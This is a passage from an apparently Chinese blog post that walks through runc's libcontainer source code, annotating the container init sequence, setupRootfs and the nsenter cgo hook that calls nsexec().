class="line"><span class="keyword">var</span> (</span><br><span class="line">pipe = os.NewFile(<span class="keyword">uintptr</span>(pipefd), <span class="string">"pipe"</span>)</span><br><span class="line">it   = initType(os.Getenv(<span class="string">"_LIBCONTAINER_INITTYPE"</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment">// clear the current process's environment to clean any libcontainer</span></span><br><span class="line"><span class="comment">// specific env vars.</span></span><br><span class="line">os.Clearenv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i initer</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// We have an error during the initialization of the container's init,</span></span><br><span class="line"><span class="comment">// send it back to the parent process in the form of an initError.</span></span><br><span class="line"><span class="comment">// If container's init successed, syscall.Exec will not return, hence</span></span><br><span class="line"><span class="comment">// this defer function will never be called.</span></span><br><span class="line"><span class="keyword">if</span> _, ok := i.(*linuxStandardInit); ok &#123;</span><br><span class="line"><span class="comment">//  Synchronisation only necessary for standard init.</span></span><br><span class="line"><span class="keyword">if</span> werr := utils.WriteJSON(pipe, syncT&#123;procError&#125;); werr != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> werr := utils.WriteJSON(pipe, newSystemError(err)); werr != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ensure that this pipe is always closed</span></span><br><span class="line">pipe.Close()</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> e := <span class="built_in">recover</span>(); e != <span class="literal">nil</span> &#123;</span><br><span class="line">err = fmt.Errorf(<span class="string">"panic from initialization: %v, %v"</span>, e, <span class="keyword">string</span>(debug.Stack()))</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">i, err = newContainerInit(it, pipe, rootfd) </span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> i.Init()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newContainerInit函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newContainerInit</span><span class="params">(t initType, pipe *os.File, stateDirFD <span class="keyword">int</span>)</span> <span class="params">(initer, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> config *initConfig</span><br><span class="line"><span class="keyword">if</span> err := json.NewDecoder(pipe).Decode(&amp;config); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := populateProcessEnvironment(config.Env); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> t &#123;</span><br><span class="line"><span class="keyword">case</span> initSetns:</span><br><span class="line"><span class="keyword">return</span> &amp;linuxSetnsInit&#123;</span><br><span class="line">config: config,</span><br><span class="line">&#125;, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> initStandard:</span><br><span class="line"><span class="keyword">return</span> &amp;linuxStandardInit&#123;</span><br><span class="line">pipe:       pipe,</span><br><span class="line">parentPid:  syscall.Getppid(),</span><br><span class="line">config:     config,</span><br><span class="line">stateDirFD: stateDirFD,</span><br><span class="line">&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"unknown init type %q"</span>, t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>populateProcessEnvironment函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// populateProcessEnvironment loads the provided environment variables into the</span></span><br><span class="line"><span class="comment">// current processes's environment.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">populateProcessEnvironment</span><span class="params">(env []<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, pair := <span class="keyword">range</span> env &#123;</span><br><span class="line">p := strings.SplitN(pair, <span class="string">"="</span>, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) &lt; <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"invalid environment '%v'"</span>, pair)</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> err := os.Setenv(p[<span class="number">0</span>], p[<span class="number">1</span>]); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化函数init:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *linuxStandardInit)</span> <span class="title">Init</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !l.config.Config.NoNewKeyring &#123;</span><br><span class="line">ringname, keepperms, newperms := l.getSessionRingParams()</span><br><span class="line"></span><br><span class="line"><span class="comment">// do not inherit the parent's session keyring</span></span><br><span class="line">sessKeyId, err := keys.JoinSessionKeyring(ringname)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// make session keyring searcheable</span></span><br><span class="line"><span class="keyword">if</span> err := keys.ModKeyringPerm(sessKeyId, keepperms, newperms); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> console *linuxConsole</span><br><span class="line"><span class="keyword">if</span> l.config.Console != <span class="string">""</span> &#123;</span><br><span class="line">console = newConsoleFromPath(l.config.Console)</span><br><span class="line"><span class="keyword">if</span> err := console.dupStdio(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> console != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := system.Setctty(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := setupNetwork(l.config); err != <span class="literal">nil</span> &#123; <span class="comment">//初始化网络</span></span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := setupRoute(l.config.Config); err != <span class="literal">nil</span> &#123; <span class="comment">//初始化route</span></span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">label.Init()</span><br><span class="line"><span class="comment">// InitializeMountNamespace() can be executed only for a new mount namespace</span></span><br><span class="line"><span class="keyword">if</span> l.config.Config.Namespaces.Contains(configs.NEWNS) &#123;</span><br><span class="line"><span class="keyword">if</span> err := setupRootfs(l.config.Config, console, l.pipe); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//设置hostname</span></span><br><span class="line"><span class="keyword">if</span> hostname := l.config.Config.Hostname; hostname != <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := syscall.Sethostname([]<span class="keyword">byte</span>(hostname)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := apparmor.ApplyProfile(l.config.AppArmorProfile); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := label.SetProcessLabel(l.config.ProcessLabel); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> l.config.Config.Sysctl &#123;</span><br><span class="line"><span class="keyword">if</span> err := writeSystemProperty(key, value); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//remount只读</span></span><br><span class="line"><span class="keyword">for</span> _, path := <span class="keyword">range</span> l.config.Config.ReadonlyPaths &#123;</span><br><span class="line"><span class="keyword">if</span> err := remountReadonly(path); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//mask路径</span></span><br><span class="line"><span class="keyword">for</span> _, path := <span class="keyword">range</span> l.config.Config.MaskPaths &#123;</span><br><span class="line"><span class="keyword">if</span> err := maskPath(path); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 获取parent信号</span></span><br><span class="line">pdeath, err := system.GetParentDeathSignal()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> l.config.NoNewPrivileges &#123;</span><br><span class="line"><span class="keyword">if</span> err := system.Prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Tell our parent that we're ready to Execv. This must be done before the</span></span><br><span class="line"><span class="comment">// Seccomp rules have been applied, because we need to be able to read and</span></span><br><span class="line"><span class="comment">// write to a socket.</span></span><br><span class="line"><span class="keyword">if</span> err := syncParentReady(l.pipe); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Without NoNewPrivileges seccomp is a privileged operation, so we need to</span></span><br><span class="line"><span class="comment">// do this before dropping capabilities; otherwise do it as late as possible</span></span><br><span class="line"><span class="comment">// just before execve so as few syscalls take place after it as possible.</span></span><br><span class="line"><span class="keyword">if</span> l.config.Config.Seccomp != <span class="literal">nil</span> &amp;&amp; !l.config.NoNewPrivileges &#123;</span><br><span class="line"><span class="keyword">if</span> err := seccomp.InitSeccomp(l.config.Config.Seccomp); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := finalizeNamespace(l.config); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// finalizeNamespace can change user/group which clears the parent death</span></span><br><span class="line"><span class="comment">// signal, so we restore it here.</span></span><br><span class="line"><span class="keyword">if</span> err := pdeath.Restore(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// compare the parent from the inital start of the init process and make sure that it did not change.</span></span><br><span class="line"><span class="comment">// if the parent changes that means it died and we were reparented to something else so we should</span></span><br><span class="line"><span class="comment">// just kill ourself and not cause problems for someone else.</span></span><br><span class="line"><span class="keyword">if</span> syscall.Getppid() != l.parentPid &#123;</span><br><span class="line"><span class="keyword">return</span> syscall.Kill(syscall.Getpid(), syscall.SIGKILL)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// check for the arg before waiting to make sure it exists and it is returned</span></span><br><span class="line"><span class="comment">// as a create time error.</span></span><br><span class="line">name, err := exec.LookPath(l.config.Args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// close the pipe to signal that we have completed our init.</span></span><br><span class="line">l.pipe.Close()</span><br><span class="line"><span class="comment">// wait for the fifo to be opened on the other side before</span></span><br><span class="line"><span class="comment">// exec'ing the users process.</span></span><br><span class="line">fd, err := syscall.Openat(l.stateDirFD, execFifoFilename, os.O_WRONLY|syscall.O_CLOEXEC, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"openat exec fifo"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, err := syscall.Write(fd, []<span class="keyword">byte</span>(<span class="string">"0"</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"write 0 exec fifo"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> l.config.Config.Seccomp != <span class="literal">nil</span> &amp;&amp; l.config.NoNewPrivileges &#123;</span><br><span class="line"><span class="keyword">if</span> err := seccomp.InitSeccomp(l.config.Config.Seccomp); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"init seccomp"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//系统调用</span></span><br><span class="line"><span class="keyword">if</span> err := syscall.Exec(name, l.config.Args[<span class="number">0</span>:], os.Environ()); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"exec user process"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置rootfs文件路径setupRootfs函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">setupRootfs</span><br><span class="line"><span class="comment">// setupRootfs sets up the devices, mount points, and filesystems for use inside a</span></span><br><span class="line"><span class="comment">// new mount namespace.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">setupRootfs</span><span class="params">(config *configs.Config, console *linuxConsole, pipe io.ReadWriter)</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := prepareRoot(config); err != <span class="literal">nil</span> &#123; <span class="comment">//准备prepareRoot</span></span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"preparing rootfs"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupDev := needsSetupDev(config)</span><br><span class="line"><span class="keyword">for</span> _, m := <span class="keyword">range</span> config.Mounts &#123;</span><br><span class="line"><span class="keyword">for</span> _, precmd := <span class="keyword">range</span> m.PremountCmds &#123;</span><br><span class="line"><span class="keyword">if</span> err := mountCmd(precmd); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"running premount command"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//mountTorootfs,挂载到rootfs</span></span><br><span class="line"><span class="keyword">if</span> err := mountToRootfs(m, config.Rootfs, config.MountLabel); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCausef(err, <span class="string">"mounting %q to rootfs %q at %q"</span>, m.Source, config.Rootfs, m.Destination)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//mountcmd</span></span><br><span class="line"><span class="keyword">for</span> _, postcmd := <span class="keyword">range</span> m.PostmountCmds &#123;</span><br><span class="line"><span class="keyword">if</span> err := mountCmd(postcmd); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"running postmount command"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> setupDev &#123;</span><br><span class="line"><span class="keyword">if</span> err := createDevices(config); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"creating device nodes"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := setupPtmx(config, console); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"setting up ptmx"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := setupDevSymlinks(config.Rootfs); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"setting up /dev symlinks"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Signal the parent to run the pre-start hooks.</span></span><br><span class="line"><span class="comment">// The hooks are run after the mounts are setup, but before we switch to the new</span></span><br><span class="line"><span class="comment">// root, so that the old root is still available in the hooks for any mount</span></span><br><span class="line"><span class="comment">// manipulations.</span></span><br><span class="line"><span class="keyword">if</span> err := syncParentHooks(pipe); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := syscall.Chdir(config.Rootfs); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCausef(err, <span class="string">"changing dir to %q"</span>, config.Rootfs)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> config.NoPivotRoot &#123;</span><br><span class="line">err = msMoveRoot(config.Rootfs)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">err = pivotRoot(config.Rootfs, config.PivotDir)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"jailing process inside rootfs"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> setupDev &#123;</span><br><span class="line"><span class="keyword">if</span> err := reOpenDevNull(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"reopening /dev/null inside container"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// remount dev as ro if specifed</span></span><br><span class="line"><span class="keyword">for</span> _, m := <span class="keyword">range</span> config.Mounts &#123;</span><br><span class="line"><span class="keyword">if</span> libcontainerUtils.CleanPath(m.Destination) == <span class="string">"/dev"</span> &#123;</span><br><span class="line"><span class="keyword">if</span> m.Flags&amp;syscall.MS_RDONLY != <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := remountReadonly(m.Destination); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCausef(err, <span class="string">"remounting %q as readonly"</span>, m.Destination)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// set rootfs ( / ) as readonly</span></span><br><span class="line"><span class="keyword">if</span> config.Readonlyfs &#123;</span><br><span class="line"><span class="keyword">if</span> err := setReadonly(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"setting rootfs as readonly"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">syscall.Umask(<span class="number">0022</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>init nsenter包导入：</p><p>在<code>runc init</code>命令的响应在文件 <strong>init.go</strong> 开头，导入 <code>nsenter</code> 包</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* init.go */</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">    <span class="string">"runtime"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"github.com/opencontainers/runc/libcontainer"</span></span><br><span class="line">    _ <span class="string">"github.com/opencontainers/runc/libcontainer/nsenter"</span></span><br><span class="line">    <span class="string">"github.com/urfave/cli"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>而<code>nsenter</code>包中开头通过 <code>cgo</code> 嵌入了一段 C 代码, 调用 <strong>nsexec()</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> nsenter</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/* nsenter.go */</span></span><br><span class="line">#cgo CFLAGS: -Wall</span><br><span class="line">extern void nsexec();</span><br><span class="line">void __attribute__((constructor)) init(void) &#123;</span><br><span class="line">    nsexec();</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line"><span class="keyword">import</span> <span class="string">"C"</span></span><br></pre></td></tr></table></figure><p>接下来，轮到 <strong>nsexec()</strong> 完成为容器创建新的 <code>namespace</code> 的工作了, <strong>nsexec()</strong> 同样很长，逐段来看</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* libcontainer/nsenter/nsexec.c */</span></span><br><span class="line">void nsexec(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> pipenum;</span><br><span class="line">    jmp_buf env;</span><br><span class="line">    <span class="keyword">int</span> sync_child_pipe[<span class="number">2</span>], sync_grandchild_pipe[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">struct</span> nlconfig_t config = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If we don't have an init pipe, just return to the go routine.</span></span><br><span class="line"><span class="comment">     * We'll only get an init pipe for start or exec.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    pipenum = initpipe();</span><br><span class="line">    <span class="keyword">if</span> (pipenum == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse all of the netlink configuration. */</span></span><br><span class="line">    nl_parse(pipenum, &amp;config);</span><br><span class="line">   </span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p><strong>initpipe()</strong> 